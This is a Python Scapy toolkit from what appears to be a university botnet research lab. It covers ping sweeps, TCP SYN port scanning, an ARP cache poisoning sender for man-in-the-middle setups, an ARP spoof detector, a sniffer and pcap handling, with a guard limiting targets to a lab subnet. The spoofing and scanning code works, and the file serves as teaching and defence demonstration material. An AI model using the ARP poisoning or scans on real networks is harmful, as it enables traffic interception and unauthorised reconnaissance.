"""
====================================================
 AUA CS 232/337 - Botnet Research Project
 Component: Scapy Network Utility Tools
 Run as root: sudo python3 scapy_tools.py [mode]
 Environment: ISOLATED VM LAB ONLY

 Source: "Python Network Programming: Forging and Sniffing
          Packets with Scapy" (ExamCollection, 2025)

 Implements the practical Python tools described in Article 3
 that are NOT already present as standalone Python modules:

   ping_host(ip)            — ICMP sr1() echo request
   ping_sweep(base, start, end) — discover live hosts in subnet
   syn_port_scan(ip, ports) — SYN scan: OPEN / CLOSED / FILTERED
   arp_spoof_send(...)      — send gratuitous ARP reply (ARP poisoning)
   arp_spoof_detect(iface)  — sniff and detect ARP spoofing
   save_pcap(pkts, file)    — wrpcap: save capture to .pcap
   load_pcap(file)          — rdpcap: load a .pcap for analysis
   packet_sniffer(iface, n) — real-time IP packet summary sniffer

 What's already in the lab (NOT duplicated here):
   Raw SYN/UDP flood          — slowloris.py, bot_agent.c
   Packet sniffing + IDS      — ids_detector.py (full Scapy sniffer)
   TLS ClientHello capture    — firewall_dpi.py, tls_ja3.py
   Queue-buffered capture     — packet_capture.py
   C-based port scanning      — mirai_scanner.c (Telnet/SSH focus)

 Article quote: "Combining forging and sniffing helps in scenarios
   such as: Network scanning, Man-in-the-middle simulations,
   Intrusion detection system testing."

 SAFETY: Runs only on 192.168.100.0/24. Hard-coded guard
   prevents accidental use outside the lab network.

 CLI modes:
   sudo python3 scapy_tools.py ping  192.168.100.20
   sudo python3 scapy_tools.py sweep 192.168.100 1 30
   sudo python3 scapy_tools.py scan  192.168.100.20 22 80 443 3306
   sudo python3 scapy_tools.py arp-spoof  <target> <spoof_as> <target_mac>
   sudo python3 scapy_tools.py arp-detect [iface] [count]
   sudo python3 scapy_tools.py sniff [iface] [count]
   sudo python3 scapy_tools.py save-pcap <file>   (captures 50 packets)
   sudo python3 scapy_tools.py load-pcap <file>   (summarises a pcap)
====================================================
"""

import argparse
import sys
import time
from typing import List, Optional

try:
    from scapy.all import (
        IP, TCP, UDP, ICMP, ARP, Ether,
        sr1, send, sendp, srp,
        sniff, wrpcap, rdpcap,
        get_if_hwaddr, conf,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False
    print("[scapy_tools] ERROR: Scapy not installed.  pip3 install scapy")
    sys.exit(1)

# ── Safety guard: only target lab /24 ─────────────────────────
LAB_SUBNET_PREFIX = "192.168.100."


def _guard(ip: str) -> None:
    """Abort if the target IP is outside the lab subnet."""
    if not ip.startswith(LAB_SUBNET_PREFIX):
        print(f"[SAFETY] Target {ip!r} is outside lab subnet "
              f"{LAB_SUBNET_PREFIX}0/24 — aborting.")
        sys.exit(1)


# ══════════════════════════════════════════════════════════════
#  PING HOST
#  Article: "Basic Packet Forging with Scapy — ICMP echo request"
#  ping_packet = IP(dst="8.8.8.8") / ICMP()
#  reply = sr1(ping_packet, timeout=2, verbose=0)
# ══════════════════════════════════════════════════════════════

def ping_host(ip: str, timeout: float = 2.0) -> bool:
    """
    Send an ICMP Echo Request to ip and return True if it replies.

    Article example:
        packet = IP(dst=ip) / ICMP()
        reply  = sr1(packet, timeout=2, verbose=0)

    Used by ping_sweep() to discover live hosts.
    """
    _guard(ip)
    pkt   = IP(dst=ip) / ICMP()
    reply = sr1(pkt, timeout=timeout, verbose=0)
    if reply and reply.haslayer(ICMP) and reply[ICMP].type == 0:
        print(f"  {ip} is UP  (ICMP reply: type=0, ttl={reply[IP].ttl})")
        return True
    else:
        print(f"  {ip} is DOWN or not responding")
        return False


# ══════════════════════════════════════════════════════════════
#  PING SWEEP
#  Article: "Example 1 — Building a Simple Ping Sweep Tool"
#  "Discovers live hosts by sending ICMP Echo Requests"
# ══════════════════════════════════════════════════════════════

def ping_sweep(subnet_base: str, start: int = 1,
               end: int = 30) -> List[str]:
    """
    Sweep subnet_base.start through subnet_base.end for live hosts.

    Article code:
        for i in range(1, 255):
            ip = f"192.168.1.{i}"
            ping_host(ip)

    Returns a list of live IPs.
    """
    live = []
    print(f"\n[ping_sweep] Scanning {subnet_base}.{start}–{end}")
    print(f"  Sending ICMP Echo Requests (sr1, timeout=1s each) …\n")

    for i in range(start, end + 1):
        ip = f"{subnet_base}.{i}"
        _guard(ip)
        pkt   = IP(dst=ip) / ICMP()
        reply = sr1(pkt, timeout=1, verbose=0)
        if reply and reply.haslayer(ICMP) and reply[ICMP].type == 0:
            print(f"  ✔ {ip} UP  (ttl={reply[IP].ttl})")
            live.append(ip)
        else:
            print(f"  ✗ {ip}")

    print(f"\n[ping_sweep] Done. Live hosts ({len(live)}): {live}")
    return live


# ══════════════════════════════════════════════════════════════
#  SYN PORT SCAN WITH RESPONSE ANALYSIS
#  Article: "Example 4 — Port Scanning with Response Analysis"
#  "sr1 TCP SYN → SYN-ACK=Open, RST=Closed, timeout=Filtered"
# ══════════════════════════════════════════════════════════════

def syn_port_scan(ip: str, ports: List[int],
                  timeout: float = 2.0) -> dict:
    """
    Perform a TCP SYN scan against each port and classify:
      OPEN     → received SYN-ACK  (flags 0x12)
      CLOSED   → received RST      (flags 0x14)
      FILTERED → no response       (timeout)

    Article code:
        packet   = IP(dst=ip) / TCP(dport=port, flags="S")
        response = sr1(packet, timeout=2, verbose=0)
        if response is None:     return "Filtered"
        elif response[TCP].flags == 0x12: return "Open"
        elif response[TCP].flags == 0x14: return "Closed"

    Returns dict: port → "OPEN" | "CLOSED" | "FILTERED"
    """
    _guard(ip)
    results = {}
    print(f"\n[syn_scan] Scanning {ip} — {len(ports)} ports")
    print(f"  Method: TCP SYN (half-open) — RST sent automatically\n")

    for port in ports:
        pkt  = IP(dst=ip) / TCP(dport=port, flags="S")
        resp = sr1(pkt, timeout=timeout, verbose=0)

        if resp is None:
            status = "FILTERED"
        elif resp.haslayer(TCP):
            f = resp[TCP].flags
            if f == 0x12:   # SYN-ACK
                status = "OPEN"
                # Send RST to avoid half-open connection accumulating
                rst = IP(dst=ip) / TCP(dport=port, sport=resp[TCP].dport, flags="R")
                send(rst, verbose=0)
            elif f & 0x04:  # RST or RST-ACK
                status = "CLOSED"
            else:
                status = f"UNKNOWN(flags={f:#04x})"
        else:
            status = "FILTERED"

        results[port] = status
        icon = {"OPEN": "✔", "CLOSED": "✗", "FILTERED": "?"}.get(status, "·")
        print(f"  {icon} Port {port:5d}: {status}")

    open_ports = [p for p, s in results.items() if s == "OPEN"]
    print(f"\n[syn_scan] Done. Open: {open_ports}")
    return results


# ══════════════════════════════════════════════════════════════
#  ARP SPOOFING (send gratuitous ARP reply)
#  Article: "Example 3 — Crafting and Detecting ARP Spoofing Packets"
#  "ARP spoofing attacks involve forging ARP replies to redirect traffic"
#  arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
# ══════════════════════════════════════════════════════════════

def arp_spoof_send(target_ip: str, spoof_ip: str, target_mac: str,
                   count: int = 5, interval: float = 2.0) -> None:
    """
    Send gratuitous ARP replies claiming that spoof_ip is at our MAC.
    Causes target to update its ARP cache — redirecting traffic for
    spoof_ip through our machine (man-in-the-middle setup).

    Article code:
        arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                           psrc=spoof_ip)
        send(arp_response, verbose=0)

    DEFENCE DEMO: run arp_spoof_detect() on the victim simultaneously
    to show the IDS catching this in real time.

    target_ip  : victim IP (who gets the poisoned cache entry)
    spoof_ip   : IP whose traffic we want to intercept (e.g. gateway)
    target_mac : victim's MAC address (from `arp -n`)
    """
    _guard(target_ip)
    _guard(spoof_ip)

    print(f"\n[arp_spoof] Poisoning {target_ip}'s cache:")
    print(f"  Claiming: '{spoof_ip}' is at our MAC")
    print(f"  Sending {count} gratuitous ARP replies every {interval}s\n")

    for i in range(count):
        arp_reply = ARP(
            op     = 2,           # op=2 → ARP reply
            pdst   = target_ip,   # destination IP
            hwdst  = target_mac,  # destination MAC
            psrc   = spoof_ip,    # we claim to be this IP
        )
        send(arp_reply, verbose=0)
        print(f"  Sent ARP reply #{i+1}: '{spoof_ip}' is at my MAC → {target_ip}")
        if i < count - 1:
            time.sleep(interval)

    print(f"\n[arp_spoof] Done. {target_ip} now routes {spoof_ip} traffic through us.")
    print("  Run arp_spoof_detect() on victim to show IDS catching this.")


# ══════════════════════════════════════════════════════════════
#  ARP SPOOF DETECTION
#  Article: "Step 2 — Sniff and Detect ARP Spoofing"
#  "Sniff for unusual ARP packets indicating spoofing attempts"
# ══════════════════════════════════════════════════════════════

def arp_spoof_detect(iface: str = "lo", count: int = 0,
                     timeout: float = 30.0) -> None:
    """
    Sniff ARP traffic and alert when the same IP maps to multiple MACs
    — the classic sign of ARP cache poisoning.

    Article code:
        def detect_arp_spoof(packet):
            if packet.haslayer(ARP) and packet[ARP].op == 2:
                print(f"ARP Reply: {packet[ARP].psrc} is at {packet[ARP].hwsrc}")
        sniff(filter="arp", prn=detect_arp_spoof, store=False)

    Enhancement over the article:
      - Tracks IP→MAC mappings across the session.
      - Alerts when one IP suddenly maps to a DIFFERENT MAC (the
        actual spoofing indicator, not just any ARP reply).
    """
    ip_mac_table: dict = {}   # ip → set of MACs seen

    print(f"\n[arp_detect] Monitoring ARP traffic on {iface}")
    print(f"  Alerting when the same IP maps to multiple MACs (spoofing indicator)\n")

    def _arp_callback(pkt):
        if not pkt.haslayer(ARP):
            return

        arp   = pkt[ARP]
        op    = arp.op
        src_ip  = arp.psrc
        src_mac = arp.hwsrc

        if op == 1:   # ARP request (who-has)
            print(f"  [WHO-HAS] {arp.pdst}? told by {src_ip} ({src_mac})")
        elif op == 2:  # ARP reply (is-at) — the article's detection target
            print(f"  [IS-AT]   {src_ip} is at {src_mac}")

            if src_ip not in ip_mac_table:
                ip_mac_table[src_ip] = {src_mac}
            else:
                known_macs = ip_mac_table[src_ip]
                if src_mac not in known_macs:
                    # NEW MAC for this IP → spoofing!
                    print(f"\n  ⚠  ARP SPOOF DETECTED!")
                    print(f"     IP {src_ip} was previously at: {known_macs}")
                    print(f"     Now claims to be at: {src_mac}")
                    print(f"     Classic ARP cache poisoning — "
                          f"traffic for {src_ip} is being redirected.\n")
                    known_macs.add(src_mac)
                ip_mac_table[src_ip] = known_macs

    sniff(
        iface   = iface,
        filter  = "arp",
        prn     = _arp_callback,
        store   = False,
        count   = count or 0,
        timeout = timeout if not count else None,
    )
    print(f"\n[arp_detect] Done. Captured IP→MAC table:")
    for ip, macs in ip_mac_table.items():
        flag = "⚠  MULTIPLE MACs!" if len(macs) > 1 else "✔ single MAC"
        print(f"  {ip:20s} → {macs}  {flag}")


# ══════════════════════════════════════════════════════════════
#  PACKET SNIFFER (real-time IP summary)
#  Article: "Simple Packet Sniffer Script"
#  def monitor_packet(packet): print(f"{ip.src} -> {ip.dst} | Protocol: {ip.proto}")
#  sniff(prn=monitor_packet, filter="ip", count=20)
# ══════════════════════════════════════════════════════════════

def packet_sniffer(iface: str = "lo", count: int = 20,
                   bpf_filter: str = "ip") -> None:
    """
    Real-time IP packet sniffer with source → destination summary.

    Article code:
        def monitor_packet(packet):
            if packet.haslayer("IP"):
                ip = packet["IP"]
                print(f"{ip.src} -> {ip.dst} | Protocol: {ip.proto}")
        sniff(prn=monitor_packet, filter="ip", count=20)

    Enhancement: adds TCP/UDP port info and human-readable protocol names.
    """
    PROTO_MAP = {1: "ICMP", 6: "TCP", 17: "UDP", 47: "GRE", 50: "ESP"}

    def _callback(pkt):
        if not pkt.haslayer(IP):
            return
        ip     = pkt[IP]
        proto  = PROTO_MAP.get(ip.proto, str(ip.proto))
        detail = ""
        if pkt.haslayer(TCP):
            detail = f"  port {pkt[TCP].sport} → {pkt[TCP].dport}  flags={pkt[TCP].flags:#04x}"
        elif pkt.haslayer(UDP):
            detail = f"  port {pkt[UDP].sport} → {pkt[UDP].dport}"
        print(f"  {ip.src:20s} → {ip.dst:20s} | {proto:5s}{detail}")

    print(f"\n[packet_sniffer] Capturing {count or '∞'} packets on {iface}"
          f"  (filter: {bpf_filter!r})\n")
    sniff(iface=iface, filter=bpf_filter, prn=_callback,
          store=False, count=count or 0)
    print("\n[packet_sniffer] Done.")


# ══════════════════════════════════════════════════════════════
#  SAVE / LOAD PCAP
#  Article: "Saving and Loading Packets"
#  packets.save("capture.pcap")  /  rdpcap("capture.pcap")
# ══════════════════════════════════════════════════════════════

def save_pcap(filename: str, iface: str = "lo",
              count: int = 50, bpf_filter: str = "ip") -> None:
    """
    Capture `count` packets and save to `filename` in pcap format.

    Article code:
        packets = sniff(count=50)
        packets.save("capture.pcap")
    """
    print(f"\n[save_pcap] Capturing {count} packets on {iface} → {filename}")
    pkts = sniff(iface=iface, filter=bpf_filter, count=count, store=True)
    wrpcap(filename, pkts)
    print(f"[save_pcap] Saved {len(pkts)} packets to {filename}")
    pkts.summary()


def load_pcap(filename: str) -> None:
    """
    Load a pcap file and print a summary of each packet.

    Article code:
        loaded_packets = rdpcap("capture.pcap")
        loaded_packets.summary()
    """
    print(f"\n[load_pcap] Loading {filename}")
    try:
        pkts = rdpcap(filename)
    except FileNotFoundError:
        print(f"  ERROR: file not found: {filename}")
        return
    except Exception as e:
        print(f"  ERROR reading pcap: {e}")
        return
    print(f"  Loaded {len(pkts)} packets\n")
    pkts.summary()

    # Post-capture filter example from article:
    http_pkts = [p for p in pkts if p.haslayer(TCP) and p[TCP].dport == 80]
    print(f"\n  HTTP (port 80) packets: {len(http_pkts)}")
    for p in http_pkts[:5]:
        if p.haslayer("Raw"):
            line = bytes(p["Raw"].load).decode(errors="ignore").split("\r\n")[0]
            print(f"    {line[:80]}")


# ══════════════════════════════════════════════════════════════
#  CLI ENTRY POINT
# ══════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="Scapy Network Tools — AUA Botnet Research Lab",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples (must be run as root):
  sudo python3 scapy_tools.py ping  192.168.100.20
  sudo python3 scapy_tools.py sweep 192.168.100 1 30
  sudo python3 scapy_tools.py scan  192.168.100.20 22 80 443 3306
  sudo python3 scapy_tools.py arp-detect lo 0 30
  sudo python3 scapy_tools.py sniff lo 20
  sudo python3 scapy_tools.py save-pcap /tmp/lab.pcap
  sudo python3 scapy_tools.py load-pcap /tmp/lab.pcap
        """,
    )
    sub = parser.add_subparsers(dest="cmd", required=True)

    # ping
    p = sub.add_parser("ping", help="ICMP echo to one host")
    p.add_argument("ip")

    # sweep
    p = sub.add_parser("sweep", help="Ping sweep of subnet range")
    p.add_argument("subnet_base", help="e.g. 192.168.100")
    p.add_argument("start", type=int, nargs="?", default=1)
    p.add_argument("end",   type=int, nargs="?", default=30)

    # scan
    p = sub.add_parser("scan", help="TCP SYN port scan")
    p.add_argument("ip")
    p.add_argument("ports", type=int, nargs="+", help="Ports to scan")

    # arp-spoof
    p = sub.add_parser("arp-spoof", help="Send ARP poisoning replies")
    p.add_argument("target_ip")
    p.add_argument("spoof_ip")
    p.add_argument("target_mac")
    p.add_argument("--count",    type=int,   default=5)
    p.add_argument("--interval", type=float, default=2.0)

    # arp-detect
    p = sub.add_parser("arp-detect", help="Detect ARP spoofing")
    p.add_argument("iface",   nargs="?", default="lo")
    p.add_argument("count",   type=int,   nargs="?", default=0)
    p.add_argument("timeout", type=float, nargs="?", default=30.0)

    # sniff
    p = sub.add_parser("sniff", help="Real-time IP packet sniffer")
    p.add_argument("iface",  nargs="?", default="lo")
    p.add_argument("count",  type=int, nargs="?", default=20)
    p.add_argument("--filter", default="ip")

    # save-pcap
    p = sub.add_parser("save-pcap", help="Capture and save to .pcap")
    p.add_argument("filename")
    p.add_argument("--iface",  default="lo")
    p.add_argument("--count",  type=int, default=50)
    p.add_argument("--filter", default="ip")

    # load-pcap
    p = sub.add_parser("load-pcap", help="Load and summarise a .pcap")
    p.add_argument("filename")

    args = parser.parse_args()

    if args.cmd == "ping":
        ping_host(args.ip)
    elif args.cmd == "sweep":
        ping_sweep(args.subnet_base, args.start, args.end)
    elif args.cmd == "scan":
        syn_port_scan(args.ip, args.ports)
    elif args.cmd == "arp-spoof":
        arp_spoof_send(args.target_ip, args.spoof_ip,
                       args.target_mac, args.count, args.interval)
    elif args.cmd == "arp-detect":
        arp_spoof_detect(args.iface, args.count, args.timeout)
    elif args.cmd == "sniff":
        packet_sniffer(args.iface, args.count, args.filter)
    elif args.cmd == "save-pcap":
        save_pcap(args.filename, args.iface, args.count, args.filter)
    elif args.cmd == "load-pcap":
        load_pcap(args.filename)


if __name__ == "__main__":
    main()
